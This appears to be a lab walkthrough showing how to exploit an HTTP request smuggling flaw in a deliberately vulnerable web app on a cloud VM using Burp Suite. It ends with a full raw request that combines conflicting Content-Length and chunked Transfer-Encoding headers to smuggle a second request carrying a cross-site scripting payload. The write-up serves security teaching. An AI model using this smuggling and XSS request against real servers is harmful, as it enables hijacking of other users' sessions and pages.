## Exploitation steps:

- Step 1: First open a temporary project on Burp Suite Community Edition

- Step 2: Then click on the external IP address of the hosted VM on cloud environment, in this case it is Google Cloud. Clicking on the IP will redirect to the external IP.

- Step 3: Copy the external IP which is on the URL, go to Burp Suite, open browser through the Burp Suite and paste the IP of the hosted VM. Now will be redirected to the vulnerable app. Now turn Intercept on from Burp Suite and refresh the page in the Burp Suite browser.

- Step 4: Once refresh the page, will see that a request will appear in the Proxy tab of Burp Suite. Copy the request, right click on the copied request and then send it to the repeater.

- Step 5: Send the request from the repeater, and will see the response. Then modify the request in the repeater to suit a HTTP smuggle attack. This is done by changing GET to POST, adding a Content-Length of 79 and adding Transfer-Encoding: chunked to the request body. Then also add a space after Connection: close and add the vulnerability following the GET method. Also add a parameter called Foo: on the very next line. Make sure the URL on the Host: parameter is the same as the URL on the Burp Suite browser.

- Step 6: Then send the request again. After that, copy the POST request, go to the Proxy tab and paste the request again under the Raw tab. Then forward this request through the Proxy tab, turn Intercept off and click the Contact tab of the page. Then click the Home page again and see that the vulnerability is exploited through the Pop-Up window.

```
POST / HTTP/1.1
Host: 34.125.4.35
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 79
Transfer-Encoding: chunked
Connection: close

0

GET /contact.php?test=123"><img/src="xx"onerror="alert(1)"> HTTP/1.1
Foo:
```